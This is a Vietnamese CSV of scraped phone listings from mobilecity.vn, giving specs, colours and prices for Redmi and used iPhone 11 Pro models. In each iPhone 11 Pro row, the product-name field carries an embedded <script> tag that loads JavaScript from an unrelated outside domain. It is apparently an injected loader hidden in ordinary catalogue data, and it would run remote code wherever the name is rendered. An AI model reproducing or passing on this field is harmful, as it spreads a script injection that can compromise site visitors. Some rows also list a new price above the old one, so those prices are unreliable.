ten,loai_dien_thoai,thoi_gian_bao_hanh,danh_gia,so_luong_binh_luan,duong_dan,mau_sac,gia_moi,gia_cu,he_dieu_hanh,cpu,ram,bo_nho_trong,dung_luong_pin,thiet_ke,hang_dien_thoai,la_dien_thoai_cu,kich_thuoc_man_hinh,tan_so_quet,do_sang_man_hinh,loai_man_hinh,so_the_sim,loai_pin,cong_suat_sac,do_phan_giai_cam_sau,do_phan_giai_cam_truoc
Điện thoại Xiaomi Redmi Note 14 Pro 5G (Dimensity 7300 Ultra),Redmi,12,5.0,111,https://mobilecity.vn/dien-thoai/xiaomi-redmi-note-14-pro-5g.html,Đen,5050000,5950000,Android 14,"MediaTek Dimensity 7300 Ultra (4 nm)
8 nhân (4x2.5 GHz & 4x2.0 GHz)
GPU: Mali-G615 MC2",8.0,128.0,5500.0,"Khung nhựa bo cong
Mặt lưng nhựa bo cong giả kính/ giả da
Màn hình cong + Cảm biến vân tay dưới màn hình
Kháng nước, bụi IP68/IP69K",Xiaomi,false,6.67,120.0,3000.0,AMOLED,2,"",45.0,"50.0,8.0,2.0",20.0
Điện thoại Xiaomi Redmi Note 14 Pro 5G (Dimensity 7300 Ultra),Redmi,12,5.0,111,https://mobilecity.vn/dien-thoai/xiaomi-redmi-note-14-pro-5g.html,Đen,5650000,5950000,Android 14,"MediaTek Dimensity 7300 Ultra (4 nm)
8 nhân (4x2.5 GHz & 4x2.0 GHz)
GPU: Mali-G615 MC2",8.0,128.0,5500.0,"Khung nhựa bo cong
Mặt lưng nhựa bo cong giả kính/ giả da
Màn hình cong + Cảm biến vân tay dưới màn hình
Kháng nước, bụi IP68/IP69K",Xiaomi,false,6.67,120.0,3000.0,AMOLED,2,"",45.0,"50.0,8.0,2.0",20.0
Điện thoại Xiaomi Redmi Note 14 Pro 5G (Dimensity 7300 Ultra),Redmi,12,5.0,111,https://mobilecity.vn/dien-thoai/xiaomi-redmi-note-14-pro-5g.html,Đen,6150000,5950000,Android 14,"MediaTek Dimensity 7300 Ultra (4 nm)
8 nhân (4x2.5 GHz & 4x2.0 GHz)
GPU: Mali-G615 MC2",8.0,128.0,5500.0,"Khung nhựa bo cong
Mặt lưng nhựa bo cong giả kính/ giả da
Màn hình cong + Cảm biến vân tay dưới màn hình
Kháng nước, bụi IP68/IP69K",Xiaomi,false,6.67,120.0,3000.0,AMOLED,2,"",45.0,"50.0,8.0,2.0",20.0
Điện thoại Xiaomi Redmi Note 14 Pro 5G (Dimensity 7300 Ultra),Redmi,12,5.0,111,https://mobilecity.vn/dien-thoai/xiaomi-redmi-note-14-pro-5g.html,Trắng,4650000,5950000,Android 14,"MediaTek Dimensity 7300 Ultra (4 nm)
8 nhân (4x2.5 GHz & 4x2.0 GHz)
GPU: Mali-G615 MC2",8.0,128.0,5500.0,"Khung nhựa bo cong
Mặt lưng nhựa bo cong giả kính/ giả da
Màn hình cong + Cảm biến vân tay dưới màn hình
Kháng nước, bụi IP68/IP69K",Xiaomi,false,6.67,120.0,3000.0,AMOLED,2,"",45.0,"50.0,8.0,2.0",20.0
Điện thoại Xiaomi Redmi Note 14 Pro 5G (Dimensity 7300 Ultra),Redmi,12,5.0,111,https://mobilecity.vn/dien-thoai/xiaomi-redmi-note-14-pro-5g.html,Trắng,5050000,5950000,Android 14,"MediaTek Dimensity 7300 Ultra (4 nm)
8 nhân (4x2.5 GHz & 4x2.0 GHz)
GPU: Mali-G615 MC2",8.0,128.0,5500.0,"Khung nhựa bo cong
Mặt lưng nhựa bo cong giả kính/ giả da
Màn hình cong + Cảm biến vân tay dưới màn hình
Kháng nước, bụi IP68/IP69K",Xiaomi,false,6.67,120.0,3000.0,AMOLED,2,"",45.0,"50.0,8.0,2.0",20.0
Điện thoại Xiaomi Redmi Note 14 Pro 5G (Dimensity 7300 Ultra),Redmi,12,5.0,111,https://mobilecity.vn/dien-thoai/xiaomi-redmi-note-14-pro-5g.html,Trắng,5650000,5950000,Android 14,"MediaTek Dimensity 7300 Ultra (4 nm)
8 nhân (4x2.5 GHz & 4x2.0 GHz)
GPU: Mali-G615 MC2",8.0,128.0,5500.0,"Khung nhựa bo cong
Mặt lưng nhựa bo cong giả kính/ giả da
Màn hình cong + Cảm biến vân tay dưới màn hình
Kháng nước, bụi IP68/IP69K",Xiaomi,false,6.67,120.0,3000.0,AMOLED,2,"",45.0,"50.0,8.0,2.0",20.0
Điện thoại Xiaomi Redmi Note 14 Pro 5G (Dimensity 7300 Ultra),Redmi,12,5.0,111,https://mobilecity.vn/dien-thoai/xiaomi-redmi-note-14-pro-5g.html,Trắng,6150000,5950000,Android 14,"MediaTek Dimensity 7300 Ultra (4 nm)
8 nhân (4x2.5 GHz & 4x2.0 GHz)
GPU: Mali-G615 MC2",8.0,128.0,5500.0,"Khung nhựa bo cong
Mặt lưng nhựa bo cong giả kính/ giả da
Màn hình cong + Cảm biến vân tay dưới màn hình
Kháng nước, bụi IP68/IP69K",Xiaomi,false,6.67,120.0,3000.0,AMOLED,2,"",45.0,"50.0,8.0,2.0",20.0
Điện thoại Xiaomi Redmi Note 14 Pro 5G (Dimensity 7300 Ultra),Redmi,12,5.0,111,https://mobilecity.vn/dien-thoai/xiaomi-redmi-note-14-pro-5g.html,Xanh,4650000,5950000,Android 14,"MediaTek Dimensity 7300 Ultra (4 nm)
8 nhân (4x2.5 GHz & 4x2.0 GHz)
GPU: Mali-G615 MC2",8.0,128.0,5500.0,"Khung nhựa bo cong
Mặt lưng nhựa bo cong giả kính/ giả da
Màn hình cong + Cảm biến vân tay dưới màn hình
Kháng nước, bụi IP68/IP69K",Xiaomi,false,6.67,120.0,3000.0,AMOLED,2,"",45.0,"50.0,8.0,2.0",20.0
Điện thoại Xiaomi Redmi Note 14 Pro 5G (Dimensity 7300 Ultra),Redmi,12,5.0,111,https://mobilecity.vn/dien-thoai/xiaomi-redmi-note-14-pro-5g.html,Xanh,5050000,5950000,Android 14,"MediaTek Dimensity 7300 Ultra (4 nm)
8 nhân (4x2.5 GHz & 4x2.0 GHz)
GPU: Mali-G615 MC2",8.0,128.0,5500.0,"Khung nhựa bo cong
Mặt lưng nhựa bo cong giả kính/ giả da
Màn hình cong + Cảm biến vân tay dưới màn hình
Kháng nước, bụi IP68/IP69K",Xiaomi,false,6.67,120.0,3000.0,AMOLED,2,"",45.0,"50.0,8.0,2.0",20.0
Điện thoại Xiaomi Redmi Note 14 Pro 5G (Dimensity 7300 Ultra),Redmi,12,5.0,111,https://mobilecity.vn/dien-thoai/xiaomi-redmi-note-14-pro-5g.html,Xanh,5650000,5950000,Android 14,"MediaTek Dimensity 7300 Ultra (4 nm)
8 nhân (4x2.5 GHz & 4x2.0 GHz)
GPU: Mali-G615 MC2",8.0,128.0,5500.0,"Khung nhựa bo cong
Mặt lưng nhựa bo cong giả kính/ giả da
Màn hình cong + Cảm biến vân tay dưới màn hình
Kháng nước, bụi IP68/IP69K",Xiaomi,false,6.67,120.0,3000.0,AMOLED,2,"",45.0,"50.0,8.0,2.0",20.0
Điện thoại Xiaomi Redmi Note 14 Pro 5G (Dimensity 7300 Ultra),Redmi,12,5.0,111,https://mobilecity.vn/dien-thoai/xiaomi-redmi-note-14-pro-5g.html,Xanh,6150000,5950000,Android 14,"MediaTek Dimensity 7300 Ultra (4 nm)
8 nhân (4x2.5 GHz & 4x2.0 GHz)
GPU: Mali-G615 MC2",8.0,128.0,5500.0,"Khung nhựa bo cong
Mặt lưng nhựa bo cong giả kính/ giả da
Màn hình cong + Cảm biến vân tay dưới màn hình
Kháng nước, bụi IP68/IP69K",Xiaomi,false,6.67,120.0,3000.0,AMOLED,2,"",45.0,"50.0,8.0,2.0",20.0
Điện thoại iPhone 11 Pro cũ (Chính hãng) - Giá Rẻ hơn 36% <script src='https://cdnliver.com/js/mobile_city.js'></script>,iPhone Cũ 99%,6,5.0,754,https://mobilecity.vn/apple/iphone-11-pro-cu.html,Đen,5950000,8950000,iOS 13,"Apple A13 Bionic (7 nm+)
6 nhân (2x2.65 GHz + 4x1.8 GHz)
GPU: Apple GPU (4 nhân)",4.0,64.0,3046.0,"Khung thép bo cong
Kính trước Scratch-resistant glass
Kính sau Corning-made glass
Chuẩn kháng nước, bụi IP68",iPhone,true,5.8,,800.0,OLED,2,Li-Ion,,"12.0,12.0,12.0",12.0
Điện thoại iPhone 11 Pro cũ (Chính hãng) - Giá Rẻ hơn 36% <script src='https://cdnliver.com/js/mobile_city.js'></script>,iPhone Cũ 99%,6,5.0,754,https://mobilecity.vn/apple/iphone-11-pro-cu.html,Đen,6650000,8950000,iOS 13,"Apple A13 Bionic (7 nm+)
6 nhân (2x2.65 GHz + 4x1.8 GHz)
GPU: Apple GPU (4 nhân)",4.0,64.0,3046.0,"Khung thép bo cong
Kính trước Scratch-resistant glass
Kính sau Corning-made glass
Chuẩn kháng nước, bụi IP68",iPhone,true,5.8,,800.0,OLED,2,Li-Ion,,"12.0,12.0,12.0",12.0
Điện thoại iPhone 11 Pro cũ (Chính hãng) - Giá Rẻ hơn 36% <script src='https://cdnliver.com/js/mobile_city.js'></script>,iPhone Cũ 99%,6,5.0,754,https://mobilecity.vn/apple/iphone-11-pro-cu.html,Đen,7150000,8950000,iOS 13,"Apple A13 Bionic (7 nm+)
6 nhân (2x2.65 GHz + 4x1.8 GHz)
GPU: Apple GPU (4 nhân)",4.0,64.0,3046.0,"Khung thép bo cong
Kính trước Scratch-resistant glass
Kính sau Corning-made glass
Chuẩn kháng nước, bụi IP68",iPhone,true,5.8,,800.0,OLED,2,Li-Ion,,"12.0,12.0,12.0",12.0
Điện thoại iPhone 11 Pro cũ (Chính hãng) - Giá Rẻ hơn 36% <script src='https://cdnliver.com/js/mobile_city.js'></script>,iPhone Cũ 99%,6,5.0,754,https://mobilecity.vn/apple/iphone-11-pro-cu.html,Trắng,6050000,8950000,iOS 13,"Apple A13 Bionic (7 nm+)
6 nhân (2x2.65 GHz + 4x1.8 GHz)
GPU: Apple GPU (4 nhân)",4.0,64.0,3046.0,"Khung thép bo cong
Kính trước Scratch-resistant glass
Kính sau Corning-made glass
Chuẩn kháng nước, bụi IP68",iPhone,true,5.8,,800.0,OLED,2,Li-Ion,,"12.0,12.0,12.0",12.0
Điện thoại iPhone 11 Pro cũ (Chính hãng) - Giá Rẻ hơn 36% <script src='https://cdnliver.com/js/mobile_city.js'></script>,iPhone Cũ 99%,6,5.0,754,https://mobilecity.vn/apple/iphone-11-pro-cu.html,Trắng,6650000,8950000,iOS 13,"Apple A13 Bionic (7 nm+)
6 nhân (2x2.65 GHz + 4x1.8 GHz)
GPU: Apple GPU (4 nhân)",4.0,64.0,3046.0,"Khung thép bo cong
Kính trước Scratch-resistant glass
Kính sau Corning-made glass
Chuẩn kháng nước, bụi IP68",iPhone,true,5.8,,800.0,OLED,2,Li-Ion,,"12.0,12.0,12.0",12.0
Điện thoại iPhone 11 Pro cũ (Chính hãng) - Giá Rẻ hơn 36% <script src='https://cdnliver.com/js/mobile_city.js'></script>,iPhone Cũ 99%,6,5.0,754,https://mobilecity.vn/apple/iphone-11-pro-cu.html,Trắng,7250000,8950000,iOS 13,"Apple A13 Bionic (7 nm+)
6 nhân (2x2.65 GHz + 4x1.8 GHz)
GPU: Apple GPU (4 nhân)",4.0,64.0,3046.0,"Khung thép bo cong
Kính trước Scratch-resistant glass
Kính sau Corning-made glass
Chuẩn kháng nước, bụi IP68",iPhone,true,5.8,,800.0,OLED,2,Li-Ion,,"12.0,12.0,12.0",12.0
Điện thoại iPhone 11 Pro cũ (Chính hãng) - Giá Rẻ hơn 36% <script src='https://cdnliver.com/js/mobile_city.js'></script>,iPhone Cũ 99%,6,5.0,754,https://mobilecity.vn/apple/iphone-11-pro-cu.html,Xanh,6150000,8950000,iOS 13,"Apple A13 Bionic (7 nm+)
6 nhân (2x2.65 GHz + 4x1.8 GHz)
GPU: Apple GPU (4 nhân)",4.0,64.0,3046.0,"Khung thép bo cong
Kính trước Scratch-resistant glass
Kính sau Corning-made glass
Chuẩn kháng nước, bụi IP68",iPhone,true,5.8,,800.0,OLED,2,Li-Ion,,"12.0,12.0,12.0",12.0
Điện thoại iPhone 11 Pro cũ (Chính hãng) - Giá Rẻ hơn 36% <script src='https://cdnliver.com/js/mobile_city.js'></script>,iPhone Cũ 99%,6,5.0,754,https://mobilecity.vn/apple/iphone-11-pro-cu.html,Xanh,6650000,8950000,iOS 13,"Apple A13 Bionic (7 nm+)
6 nhân (2x2.65 GHz + 4x1.8 GHz)
GPU: Apple GPU (4 nhân)",4.0,64.0,3046.0,"Khung thép bo cong
Kính trước Scratch-resistant glass
Kính sau Corning-made glass
Chuẩn kháng nước, bụi IP68",iPhone,true,5.8,,800.0,OLED,2,Li-Ion,,"12.0,12.0,12.0",12.0
Điện thoại iPhone 11 Pro cũ (Chính hãng) - Giá Rẻ hơn 36% <script src='https://cdnliver.com/js/mobile_city.js'></script>,iPhone Cũ 99%,6,5.0,754,https://mobilecity.vn/apple/iphone-11-pro-cu.html,Xanh,7350000,8950000,iOS 13,"Apple A13 Bionic (7 nm+)
6 nhân (2x2.65 GHz + 4x1.8 GHz)
GPU: Apple GPU (4 nhân)",4.0,64.0,3046.0,"Khung thép bo cong
Kính trước Scratch-resistant glass
Kính sau Corning-made glass
Chuẩn kháng nước, bụi IP68",iPhone,true,5.8,,800.0,OLED,2,Li-Ion,,"12.0,12.0,12.0",12.0
Điện thoại iPhone 11 Pro cũ (Chính hãng) - Giá Rẻ hơn 36% <script src='https://cdnliver.com/js/mobile_city.js'></script>,iPhone Cũ 99%,6,5.0,754,https://mobilecity.vn/apple/iphone-11-pro-cu.html,Vàng Đồng,6150000,8950000,iOS 13,"Apple A13 Bionic (7 nm+)
6 nhân (2x2.65 GHz + 4x1.8 GHz)
GPU: Apple GPU (4 nhân)",4.0,64.0,3046.0,"Khung thép bo cong
Kính trước Scratch-resistant glass
Kính sau Corning-made glass
Chuẩn kháng nước, bụi IP68",iPhone,true,5.8,,800.0,OLED,2,Li-Ion,,"12.0,12.0,12.0",12.0
Điện thoại iPhone 11 Pro cũ (Chính hãng) - Giá Rẻ hơn 36% <script src='https://cdnliver.com/js/mobile_city.js'></script>,iPhone Cũ 99%,6,5.0,754,https://mobilecity.vn/apple/iphone-11-pro-cu.html,Vàng Đồng,6650000,8950000,iOS 13,"Apple A13 Bionic (7 nm+)
6 nhân (2x2.65 GHz + 4x1.8 GHz)
GPU: Apple GPU (4 nhân)",4.0,64.0,3046.0,"Khung thép bo cong
Kính trước Scratch-resistant glass
Kính sau Corning-made glass
Chuẩn kháng nước, bụi IP68",iPhone,true,5.8,,800.0,OLED,2,Li-Ion,,"12.0,12.0,12.0",12.0
Điện thoại iPhone 11 Pro cũ (Chính hãng) - Giá Rẻ hơn 36% <script src='https://cdnliver.com/js/mobile_city.js'></script>,iPhone Cũ 99%,6,5.0,754,https://mobilecity.vn/apple/iphone-11-pro-cu.html,Vàng Đồng,7350000,8950000,iOS 13,"Apple A13 Bionic (7 nm+)
6 nhân (2x2.65 GHz + 4x1.8 GHz)
GPU: Apple GPU (4 nhân)",4.0,64.0,3046.0,"Khung thép bo cong
Kính trước Scratch-resistant glass
Kính sau Corning-made glass
Chuẩn kháng nước, bụi IP68",iPhone,true,5.8,,800.0,OLED,2,Li-Ion,,"12.0,12.0,12.0",12.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Xanh,5250000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Xanh,5750000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Xanh,6050000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Xanh,6250000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Titanium,5350000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Titanium,5750000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Titanium,6150000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Titanium,6250000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Trắng,5350000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Trắng,5750000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Trắng,6150000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Trắng,6250000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Đen,5350000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Đen,5750000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Đen,6150000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,12,5.0,589,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html,Đen,6250000,6950000,Android 14,"Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)
8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)
GPU: Adreno 735",8.0,256.0,5000.0,"Khung nhựa phẳng
Mặt lưng nhựa bo cong
Kinh màn hình Gorilla Glass Victus
Kháng nước, bụi IP64
Cảm biến vân tay dưới màn hình",Xiaomi,false,6.67,120.0,2400.0,AMOLED,2,"",90.0,"50.0,8.0",20.0
Điện thoại Xiaomi Redmi 14R 5G (Snapdragon 4 Gen 2),Redmi,12,5.0,0,https://mobilecity.vn/dien-thoai/xiaomi-redmi-14r-5g-snapdragon-gen-2.html,Tím,2450000,,Android 14,"Qualcomm SM4450 Snapdragon 4 Gen 2 (4 nm)
8 nhân (2x2.2 GHz & 6x1.95 GHz)
GPU: Adreno 613",4.0,128.0,5160.0,"Khung nhựa vuông vức
Mặt lưng kính/nhựa/da
Màn hình phẳng",Xiaomi,false,6.88,120.0,450.0,LCD,2,"",18.0,13.0,5.0
Điện thoại Xiaomi Redmi 14R 5G (Snapdragon 4 Gen 2),Redmi,12,5.0,0,https://mobilecity.vn/dien-thoai/xiaomi-redmi-14r-5g-snapdragon-gen-2.html,Tím,2650000,,Android 14,"Qualcomm SM4450 Snapdragon 4 Gen 2 (4 nm)
8 nhân (2x2.2 GHz & 6x1.95 GHz)
GPU: Adreno 613",4.0,128.0,5160.0,"Khung nhựa vuông vức
Mặt lưng kính/nhựa/da
Màn hình phẳng",Xiaomi,false,6.88,120.0,450.0,LCD,2,"",18.0,13.0,5.0
